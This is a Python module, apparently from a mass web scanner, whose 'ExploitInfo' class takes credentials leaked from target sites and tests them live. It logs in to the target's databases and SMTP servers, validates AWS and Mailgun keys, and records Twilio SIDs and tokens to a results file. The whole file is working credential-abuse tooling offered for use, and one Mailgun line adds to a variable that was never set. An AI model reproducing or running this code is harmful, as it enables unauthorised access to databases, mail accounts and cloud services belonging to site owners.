# cython: language_level=3

import re
import socket
import threading
import src.utils.generics.generic as UtilsGenerics
import src.vulnerability.services.check_database as ProcessDB
import src.vulnerability.services.check_aws as ProccessAws
import src.vulnerability.services.check_smtp as ProcessSmtp
from urllib.parse import urlparse
from config.params import ConfigConst


class ExploitInfo:
    def __init__(self):
        self.BAD_HOST_DB = ["127.0.0.1", "localhost", "0.0.0.0"]
        self.BLACKLIST_SMTP_KEY = ["null", "[protected]", ""]
        self.asterisk_pattern = re.compile(r"^\*+$")
        self.ADDITIONAL_SMTP_INFO = [
            "smtp encryption",
            "smtp from address",
            "smtp from name",
        ]
        self.RESULT_AWS_KEY = ConfigConst.CommonPathConfig.RESULT_AWS_KEY
        self.RESULT_TWILIO_PATH = ConfigConst.CommonPathConfig.RESULT_TWILIO_KEY
        self.file_lock = threading.Lock()
        self.logger_vuln = UtilsGenerics.setup_logging(
            logger_name=f"{ConfigConst.LoggingConfig.LOGGER_VULN_NAME}",
            log_file=ConfigConst.LoggingConfig.VULN_LOG_FILE_PATH,
        )
        self.process_db = ProcessDB.ProcessDatabase()
        self.process_smtp = ProcessSmtp.ProcessSmtp()
        self.process_aws_key = ProccessAws.ProccessAwsKey()
        self.process_mailgun = ProcessSmtp.ProcessMailgunSecretKey()
        self.process_twilio = ProcessSmtp.ProcessTwilioApi()

    def run(self, json, url, urlvuln, session):
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname

        is_success = False

        json = UtilsGenerics.remove_duplicates_and_empty_entries(json)
        if "database" in json and isinstance(json["database"], list):
            for db in json["database"]:
                try:
                    db_host = db.get("db host", socket.gethostbyname(hostname))
                    db["db host"] = db_host
                    db["db port"] = db.get("db port", 3306)
                    if db_host in self.BAD_HOST_DB:
                        db_host = socket.gethostbyname(hostname)
                    if not db.get("db connection"):
                        db["db connection"] = "Unknown"
                    if db_host:
                        database_founded = self.process_db.run(
                            db_host,
                            db["db username"],
                            db["db password"],
                            db["db name"],
                            db["db port"],
                            url,
                            session,
                        )
                        if database_founded:
                            is_success = True
                except Exception as e:
                    self.logger_vuln.error(f"ExploitInfo - DB error : {e}")
                    continue

        if "smtp" in json and isinstance(json["smtp"], list):
            for smtp in json["smtp"]:
                try:
                    is_blacklisted = False
                    for key in ["smtp host", "smtp username", "smtp password"]:
                        value = smtp.get(key, "")
                        if value in self.BLACKLIST_SMTP_KEY or self.asterisk_pattern.match(value):
                            is_blacklisted = True
                            break
                    if is_blacklisted:
                        continue

                    for additional in self.ADDITIONAL_SMTP_INFO:
                        smtp[f"{additional}"] = smtp.get(f"{additional}", "Unknow")

                    if smtp["smtp host"].startswith("ssl://"):
                        smtp["smtp host"] = smtp["smtp host"].replace("ssl://", "")

                    smtp_founded = self.process_smtp.run(
                        smtp["smtp host"],
                        smtp["smtp port"],
                        smtp["smtp username"],
                        smtp["smtp password"],
                    )
                    if smtp_founded:
                        is_success = True
                except Exception as e:
                    self.logger_vuln.error(f"ExploitInfo - SMTP error : {e} for url : {url}")
                    continue

        if "aws" in json and isinstance(json["aws"], list):
            for aws in json["aws"]:
                try:
                    if aws.get("aws key id", "") == "" or aws.get("aws secret key", "") == "":
                        continue
                    aws_region = aws.get("aws region", "Unknow") or "Unknow"

                    aws_founded = self.process_aws_key.run(
                        aws["aws key id"], aws["aws secret key"], aws_region, url
                    )
                    if aws_founded:
                        is_success = True
                except Exception as e:
                    self.logger_vuln.error(f"ExploitInfo - AWS error : {e}")
                    continue

        if "mailgun" in json and isinstance(json["mailgun"], list):
            for mailgun in json["mailgun"]:
                try:
                    if mailgun.get("mailgun secret", "") != "":
                        mailgun_key_success = self.process_mailgun.run(
                            mailgun["mailgun secret"]
                        )
                        if mailgun_key_success:
                            is_success = True
                    if (
                        mailgun.get("mailgun smtp username", "") != ""
                        and mailgun.get("mailgun smtp password", "") != ""
                    ):
                        mailgun_smtp_success += ProcessSmtp.ProcessSmtp().run(
                            "smtp.mailgun.org",
                            587,
                            mailgun["mailgun smtp username"],
                            mailgun["mailgun smtp password"],
                        )
                        if mailgun_smtp_success:
                            is_success = True
                except Exception as e:
                    self.logger_vuln.error(
                        f"ExploitInfo - Mailgun error : {e} / with url : {urlvuln}"
                    )
                    continue

        if "twilio" in json and isinstance(json["twilio"], list):
            for twilio in json["twilio"]:
                try:
                    if twilio.get("twilio sid", "") == "" or twilio.get("twilio token", "") == "":
                        break
                    UtilsGenerics.push_result(
                        self,
                        self.RESULT_TWILIO_PATH,
                        f"{twilio['twilio sid']} | {twilio['twilio token']} | Checked : False | {UtilsGenerics.ret_hour()}\n",
                    )

                    is_success = True
                except Exception as e:
                    self.logger_vuln.error(f"ExploitInfo - Mailgun error : {e}")
                    continue

        return is_success
